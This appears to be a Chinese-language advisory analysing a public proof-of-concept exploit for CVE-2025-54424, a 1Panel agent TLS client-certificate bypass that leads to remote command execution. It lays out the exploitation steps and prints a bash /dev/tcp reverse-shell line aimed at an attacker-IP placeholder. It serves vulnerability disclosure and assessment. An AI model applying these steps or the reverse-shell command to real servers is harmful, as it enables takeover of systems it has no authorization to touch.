## CVE-2025-54424 - 1Panel 证书验证绕过导致的远程命令执行 (RCE)

**漏洞编号:** CVE-2025-54424

**漏洞类型:** 证书验证绕过导致的远程命令执行 (RCE)

**影响应用:** 1Panel

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** 1Panel ≤ v2.0.5

**利用条件:** 无需认证,通过伪造证书可绕过Agent端TLS验证,需网络可达目标Agent。

**POC 可用性:** 10/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

POC有效性分析:
提供的Python POC脚本 `CVE-2025-54424.py` 是一个功能完整、高度可靠的漏洞利用工具，用于演示和利用1Panel Agent的TLS证书验证绕过漏洞。该脚本的核心在于动态生成一个自签名的客户端TLS证书，其Common Name (CN) 被设置为“panel_client”。这一设定至关重要，因为它精确匹配了受影响的1Panel Agent版本中，`tls.RequireAnyClientCert` 认证策略的缺陷，该策略只检查证书的存在性，而不验证其可信度或颁发者。脚本首先通过 `check_target` 函数执行一个HTTP预检，向目标Agent的`/api/v2/dashboard/base/os`接口发送带有伪造证书的HTTPS GET请求。如果收到200 OK响应，则表明证书绕过成功且Agent可能存在漏洞，为后续的RCE奠定基础。

随后，`exploit_target` 函数利用相同的伪造证书建立一个WebSocket连接。这是执行远程命令的通道。脚本支持两种主要的利用方式：`system_exec` 用于执行任意系统命令，例如`ls -la /`或`id`，并将结果通过WebSocket返回给攻击者；`reverse_shell` 则用于建立一个反向shell连接，允许攻击者获得目标服务器的交互式命令行控制。脚本采用了多线程处理，能够同时扫描和利用多个目标，提高了效率。参数解析模块 `argparse` 的使用使得脚本具有高度的灵活性和用户友好性，支持指定目标、端口、执行命令、反向shell地址以及代理配置。此外，脚本在临时文件中生成并管理证书和私钥，并在完成后进行清理，展现了良好的编程实践。总体而言，该POC脚本设计精良，功能全面，是验证和利用CVE-2025-54424的有效工具。

利用步骤:
1.  **目标识别**: 攻击者首先需要确定网络中运行的1Panel Agent服务。这些Agent通常监听特定端口（如7777），并通过HTTPS进行通信。
2.  **证书伪造**: 攻击者利用POC脚本内置的功能，动态生成一个自签名的客户端TLS证书和对应的私钥。该证书的CN字段必须被设置为“panel_client”，以满足1Panel Agent端存在缺陷的`tls.RequireAnyClientCert`认证策略的要求。
3.  **漏洞探测**: POC脚本首先会向目标Agent发送一个带有所伪造证书的HTTPS GET请求，例如访问`/api/v2/dashboard/base/os`。如果Agent响应200 OK，则表明证书验证绕过成功，目标可能存在漏洞。
4.  **建立WebSocket连接**: 在确认证书绕过有效后，POC脚本将利用相同的伪造证书，通过HTTPS协议在`/ws`路径上与目标Agent建立一个WebSocket连接。这个连接是后续命令执行的信道。
5.  **发送恶意载荷**: 通过已建立的WebSocket连接，攻击者可以发送JSON格式的恶意指令，实现远程命令执行。POC脚本提供两种模式：
    *   **任意命令执行 (`system_exec`)**: 攻击者可以指定任意的系统命令（如`whoami`, `cat /etc/passwd`），Agent会在目标服务器上执行这些命令，并将输出通过WebSocket返回。
    *   **反向Shell (`reverse_shell`)**: 攻击者可以指定自己的IP地址和端口，脚本会发送一个预设的反向shell命令（例如`bash -i >& /dev/tcp/<攻击者IP>/<端口> 0>&1`），使目标服务器连接回攻击者的监听器，从而获得一个完全交互式的Shell会话。
6.  **结果接收**: 攻击者通过WebSocket接收命令执行的结果或维护反向Shell会话，从而完全控制目标服务器。
整个过程高度自动化，降低了攻击者的技术门槛，使得该RCE漏洞易于利用。

投毒风险分析:
对`CVE-2025-54424.py` POC代码的详细审查表明，其投毒风险评估为**低**，约为5%。以下是评估依据：
1.  **代码透明度和可读性**: 脚本代码结构清晰，逻辑简洁明了，易于理解和审计。核心功能模块化，变量命名规范，且没有发现任何形式的代码混淆或加密，这有助于安全研究人员快速验证其行为的合法性。
2.  **依赖库的安全性**: POC脚本所依赖的所有Python库，如`requests`、`websocket-client`、`cryptography`、`argparse`等，均为Python生态系统中广泛使用、经过充分测试和高度信任的标准库或常用第三方库。脚本没有引入或尝试从非官方、可疑来源下载任何未知或未经审查的二进制文件或库。
3.  **网络行为的预期性**: 脚本的所有网络通信行为都符合漏洞利用工具的预期模式。它仅与指定的目标服务器建立HTTPS和WebSocket连接进行漏洞探测与利用，并可能建立反向Shell连接回攻击者指定的IP/端口。除了这些直接与漏洞利用相关的活动外，代码中未发现任何未经授权的额外外部通信，例如向第三方未知服务器回传数据、下载恶意负载或进行C2C通信。
4.  **功能实现的目的性**: 脚本的功能严格限定在漏洞探测、证书伪造、命令执行和反向Shell建立等漏洞利用范畴内。没有迹象表明它会执行任何超出此范围的恶意操作，例如在目标系统上植入持久性后门、进行挖矿、窃取本地敏感文件、篡改系统配置或滥用资源等。脚本中实现的`system_exec`和`reverse_shell`功能是RCE漏洞利用的直接结果，而非POC本身携带的恶意负载。
5.  **临时文件管理**: 脚本动态生成的自签名证书和私钥文件被存储在临时位置，且在正常执行完毕后会进行清理，避免了在文件系统上留下不必要的痕迹。
综上所述，该POC代码是纯粹用于漏洞验证和利用的安全工具，其设计和实现均符合安全研究的最佳实践。其低投毒风险意味着使用者可以相对放心地对其进行分析和测试，但任何执行远程命令的行为都应在授权且受控的环境中进行。

**项目地址:** https://github.com/gmh5225/CVE-2025-54424

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-54424
